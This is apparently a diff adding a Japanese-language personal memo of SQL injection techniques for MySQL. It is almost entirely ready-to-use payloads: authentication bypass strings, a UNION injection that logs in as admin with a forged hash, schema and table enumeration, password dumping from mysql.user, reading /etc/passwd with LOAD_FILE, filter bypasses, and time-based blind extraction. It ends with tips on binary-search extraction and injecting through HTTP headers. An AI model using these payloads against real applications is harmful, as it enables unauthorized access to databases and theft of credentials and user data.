@@ -1,0 +1,138 @@
+SQL injection メモ
+-----------------
+
+逆引き
+========
+
+* チェックポイント
+1. クオートされてるか?
+2. エラーメッセージは出るか?
+3. クオートがサニタイズされているか?
+
+* unix: `echo "hoge"` -> sql: `SELECT "hoge"`
+  16進数: `SELECT 0x686f67650a`
+  concat: `SELECT CONCAT(char(104), char(111), char(103), char(101))`
+
+* コメントアウトの確認: `?id='1` -> エラーメッセージが出たらOK
+
+* echo 文: `SELECT 'hello'`, 任意の回数だけ入れ子に出来る `SELECT (SELECT (SELECT 'hello'))`
+
+* NULL チェック: `SELECT ISNULL(NULL)`
+
+* アカウント bypass:
+# 1' OR 1 = 1 --
+# 1" OR 1 = 1 #
+query: SELECT * FROM users WHERE id = '1' OR 1 = 1 --' password='pass';
+
+* sql が出来るか確認
+# 15s 以上の場合は sql injection できる
+# 1' UNION ALL SELECT 1,sleep(15) --
+query: SELECT * FROM users WHERE id = '1' UNION ALL SELECT 1,sleep(15) -- ' password='pass'
+
+
+* ユーザー名が分かっている場合, かつパスワードがハッシュ値が保存されている場合（例: admin）:
+  username: admin
+  passowrd: 1' AND 1 = 0 UNION ALL SELECT 'admin', '21232f297a57a5a743894a0e4a801fc3' --
+  query: SELECT * FROM users WHERE id='$user' and password = '$password';
+
+* 列数の調査:
+  `ORDER BY N --`
+  `SELECT * FROM users WHERE id='' GROUP BY 1,2,3 HAVING 1=1; --`
+
+* 任意の文字列を表示させる: `SELECT * FROM Table WHERE id [= -1 UNION ALL SELECT 1, 2, 3, 4 --]`
+
+* テーブル名一覧: `SELECT table_name FROM information_schema.TABLES;`
+
+* ユーザー情報表示: `USER()`
+
+* ファイル所有権: `SELECT concat(user(), 0x3a, Password, 0x3a, file_priv) FROM mysql.users`
+
+* パスワード: `SELECT user, password FROM mysql.user`
+
+* データベースネーム: `SELECT schema_name FROM information_schema.schemata;`
+
+* データベース+テーブル: `SELECT table_schema, table_name, 1 FROM information_schema.tables`
+
+* ファイル読込: `LOAD_FILE("/etc/passwd")`
+
+* 1 column ずつしか読み込めない場合: `LIMIT 1 OFFSET 3`
+
+* パターンマッチ: `WHERE table_name LIKE "%user%"`
+
+* ユーザー名が入っているテーブルを探す: `SELECT table_schema, table_name FROM information_schema.tables WHERE table_name LIKE 0x257573657225`
+
+* データベースとテーブルからカラム名を調べる:
+  `SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema='db_name' AND table_name='tb_name'`
+
+* DB ファイルの場所: `SELECT @@datadir`
+
+* ホスト名: `SELECT @@hostname`
+
+ * ユーザー: `SELECT USER()`
+
+* システムユーザー: `SELECT SYSTEM_USER()`
+
+* 現在のデータベース: `SELECT DATABASE()`
+
+* シングルクオートで囲まれている時: `a' OR 1 = 1; --`, `a' OR 8888 = 8888; --`
+
+* ダブルクオートで囲まれている時: `a" OR 1 = 1; --`, `a" OR 8888 = 8888; --`
+
+* クオートされているかを見抜く: `?id=1-0`, `?id=1` を比較する
+
+* MYSQL だけ通す: `/*! MYSQL Special SQL */`
+
+* 16進数同士の足し算: `SELECT 0x20+0x0` -> 32
+
+* スペースをバイパス: `SELECT/**/*/**/FROM/**/users;--`
+
+* クオートされてるか？
+  * 数値: `?id=1`, `?id=1+0`, `?id=1 OR 1=1`
+  * 文字: `?id=hello`, `?id=he' 'llo`
+
+* エラーメッセージを用いて値を取得する
+  * `SELECT extractvalue('', concat('\$', (SELECT name FROM users LIMIT 1)))`
+
+* 一番左の文字列の文字コードを返す: `select ascii("hoge")`
+
+* ベンチマーク: `benchmark(5000000, select * from users)`
+
+* MYSQL のブラインドインジェクション: `SELECT IF(1=0, 'true', benchmark(20000000, sha1(0x0)))`
+
+* MYSQL でテーブルを調べる:
+  `SELECT substring((SELECT distinct(table_schema) FROM information_schema.tables LIMIT 1 OFFSET 1), 1, 1) > '0';`
+
+* テーブルの数を調べる:
+  `SELECT (SELECT count(table_name) FROM information_schema.tables WHERE table_schema='db_name')`
+
+ブラインドSQLインジェクション関係
+================================
+
+* sleep が使えるかどうかテスト:
+  `SELECT benchmark(10000000, sha1(0x0))`
+  `SELECT sleep(15)`
+
+* DB の最初の1文字を調べる:
+  `SELECT if(substring((SELECT distinct(table_schema) FROM information_schema.tables LIMIT 1 OFFSET 1), 1, 1) <= 0x40, sleep(15), 0x0)` -> db_table の最初
+   # 0x20 で終端
+
+* 現在のDBの最初の1文字を調べる
+  `SELECT if(substring(database(), 1, 1) <= 0x40, sleep(15), 0x0)` -> 現在の DB
+   # 0x20 で終端
+
+* MYSQLデータベースの名前が一致するかどうかの確認:
+  `SELECT if(database() = "db_name", sleep(15), 0x0)`
+
+* MYSQLテーブルの数を調べる
+  `SELECT if((SELECT count(table_name) FROM information_schema.tables WHERE table_schema=database()) <= 2, sleep(15), 0x0);` -> 2 以下
+
+
+
+注意
+====
+
+* ブラインドSQLは線形探索ではなく2分探索で探す
+
+* X_FORWARDED_FOR, Referer, UserAgent, Cookie の内容をデータベースに保存することも多いので header-injection も有効(post, get だけではない)
+
+
